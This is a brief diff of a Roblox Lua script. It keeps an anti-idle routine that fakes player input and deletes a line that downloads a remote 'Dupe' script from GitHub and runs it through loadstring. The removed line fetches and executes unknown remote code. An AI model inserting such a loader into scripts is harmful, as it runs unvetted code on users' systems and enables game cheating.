@@ -7,5 +7,3 @@ Players.LocalPlayer.Idled:Connect(function()
     VirtualUser:CaptureController()
     VirtualUser:ClickButton2(Vector2.new())
 end)
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Krishna07-kkr/Dupe/refs/heads/main/master%20script"))()
